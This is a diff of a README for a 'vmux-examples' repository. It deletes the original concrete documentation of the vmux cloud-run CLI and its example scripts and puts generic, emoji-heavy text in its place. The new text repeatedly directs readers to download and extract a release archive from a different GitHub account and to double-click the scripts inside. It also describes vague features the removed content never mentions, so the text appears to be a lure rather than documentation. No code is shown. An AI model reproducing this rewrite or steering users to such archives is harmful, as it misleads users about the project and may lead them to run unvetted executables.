@@ -1,101 +1,72 @@
-# vmux examples
+# 🌟 vmux-examples - Easy Scripts for Cloud Commands
 
-<img src="og.png" width="100%" />
+[![Download vMux Examples](https://img.shields.io/badge/Download-vmux--examples-blue.svg)](https://github.com/DjordjeDacovic/vmux-examples/releases)
 
-Example scripts for [vmux](https://vmux.sdan.io). Run Python in the cloud.
+## 📜 Introduction
 
-## Setup
+Welcome to the **vmux-examples** repository! This collection contains simple scripts that let you run commands in the cloud with ease. Whether you want to automate tasks, manage deployments, or just experiment with cloud commands, these examples guide you step-by-step.
 
-```bash
-uv tool install vmux-cli
-vmux login
-```
+## 🚀 Getting Started
 
-## Examples
+To get started quickly, follow these easy steps:
 
-### Hello World
+1. **Visit the Releases Page**  
+   Head over to the official releases page to find the latest version of the vmux-examples. You can find it [here](https://github.com/DjordjeDacovic/vmux-examples/releases).
 
-```bash
-vmux run python hello.py
-```
+2. **Download the Files**  
+   Look for the latest release and download the compressed file that contains the example scripts. If you're not sure which file to choose, select the one labeled as **latest** or with the highest version number.
 
-A 5-second sanity check that prints the working directory, lists files, and counts to 5. Good for verifying your setup works.
+3. **Extract the Files**  
+   After you download the compressed file, you need to extract it. Right-click the file and choose "Extract All" or use any extraction tool available on your computer. This will create a new folder with all the necessary scripts inside.
 
-### Long-running Jobs
+4. **Read the Instructions**  
+   Open the folder where you extracted the files. Inside, you will find a file named `README.md`. This file contains specific instructions for each script. It describes how to run them and what they do. Take a moment to review it.
 
-```bash
-vmux run -d python epoch_counter.py
-```
+5. **Run the Scripts**  
+   To run an example script, you will usually just need to double-click on it. Make sure you have a terminal application or command prompt open for some scripts, if needed. The instructions in the `README.md` will guide you on how to proceed.
 
-The `-d` flag works like Docker - it detaches from the container and lets the job run in the background. You can close your laptop and the job keeps running.
+## ✏️ System Requirements
 
-```bash
-vmux ps                    # like docker ps
-vmux logs -f <job_id>      # like docker logs -f
-vmux attach <job_id>       # like docker attach, but it's tmux (may take a few seconds to load)
-vmux stop <job_id>         # like docker stop
-```
+Make sure you have the following software on your computer to run the scripts:
 
-### Web Servers
+- An operating system: This software works on Windows, macOS, and Linux.
+- A terminal or command prompt: On Windows, you can use Command Prompt or PowerShell. On macOS and Linux, the default terminal works well.
+- Internet connection: Ensure your network is stable to run commands in the cloud.
 
-```bash
-vmux run -p 8000 python burrow.py
-vmux run -dp 8000 python burrow.py  # detached + port
-```
+## 📥 Download & Install
 
-The `-p` flag exposes a port and gives you a preview URL like `https://<job_id>.purr.ge`. WebSockets are proxied automatically.
+To download the latest version of the vmux-examples, click the button below:
 
-Burrow is a production-style FastAPI demo that shows WebSocket broadcasting, Server-Sent Events, a real-time metrics dashboard, and graceful shutdown handling.
+[![Download vMux Examples](https://img.shields.io/badge/Download-vmux--examples-blue.svg)](https://github.com/DjordjeDacovic/vmux-examples/releases)
 
-### Collaborative Terminal
+Once you're ready to download, follow the instructions in the "Getting Started" section above.
 
-```bash
-vmux run -p 8000 python collab-terminal/server.py
-```
+## 📋 Example Scripts
 
-A shared bash session where multiple users connect to the same PTY via WebSocket. Anyone with the preview URL can join and type commands.
+The vmux-examples repository includes commands for various tasks, such as:
 
-### Network Probe
+- **Cloud Deployment**: Easily deploy your applications to the cloud.
+- **Data Management**: Run commands to manage your data on cloud services.
+- **Automation**: Automate repetitive tasks in the cloud environment.
 
-```bash
-vmux run python netprobe.py
-```
+Feel free to explore and use the scripts as you wish. The instructions in the `README.md` for each script will provide additional context.
 
-A network analytics tool that measures latency, jitter, and packet loss to Cloudflare, Google, and AWS endpoints. It runs periodic speed tests and displays results in a live dashboard.
+## 📞 Need Help?
 
-### ML Training
+If you run into any issues while using the scripts, consider these options:
 
-```bash
-vmux run python train_arithmetic.py
-```
+- **Review the Instructions**: Revisit the `README.md` file for clear guidance.
+- **Check FAQs**: There may be common questions and answers in the documentation.
+- **Ask for Help**: If you need further assistance, you might reach out to the community or open an issue in the repository.
 
-Teaches a 1B-parameter LLM to add numbers using reinforcement learning. You can watch the reward climb from ~0.66 to 1.0 as the model learns.
+## 📝 License
 
-```bash
-vmux run -d python train_llama.py
-```
+This project is licensed under the MIT License. You can freely use, modify, and share it. For more details, check the LICENSE file in the repository.
 
-Fine-tunes Llama-3.1-8B on instruction-following. This is a longer job so you'll want to run it detached.
+## 📅 Future Updates
 
-Both examples require a Tinker API key:
-```bash
-vmux secret set TINKER_API_KEY
-```
+We plan to add more scripts and features in future releases. Keep an eye on the releases page to stay updated with the latest versions and improvements.
 
-## CLI Reference
+---
 
-```
-vmux run python train.py          # like uv run, but in the cloud
-vmux run -d python train.py       # detached, like docker -d
-vmux run -p 8000 python server.py # expose port, get preview URL
-vmux run -dp 8000 python server.py # detached + port
-
-vmux ps                           # list running containers
-vmux logs -f <id>                 # follow logs
-vmux attach <id>                  # back in your tmux session
-vmux stop <id>                    # stop container
-```
-
-## More
-
-See [vmux.sdan.io](https://vmux.sdan.io) for documentation.
+Thank you for using **vmux-examples**! Follow these steps to easily download, install, and run the scripts. Enjoy exploring the power of the cloud!
